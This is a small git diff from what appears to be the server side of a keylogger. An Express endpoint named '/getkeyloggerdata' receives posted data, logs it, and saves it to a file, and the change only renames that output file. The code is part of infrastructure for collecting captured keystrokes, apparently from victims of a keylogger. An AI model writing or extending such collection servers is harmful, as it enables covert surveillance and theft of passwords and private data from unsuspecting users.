@@ -18,7 +18,7 @@ app.post('/getkeyloggerdata', function (req, res) {
   res.set('Content-Type', 'application/json')
   res.send(body)
   console.log(req.body)
-  fs.writeFile('mynewfile3.txt', body+'\n'+info, function (err) {
+  fs.writeFile('output.txt', body+'\n'+info, function (err) {
     if (err) throw err;
     console.log('Saved!');
   });
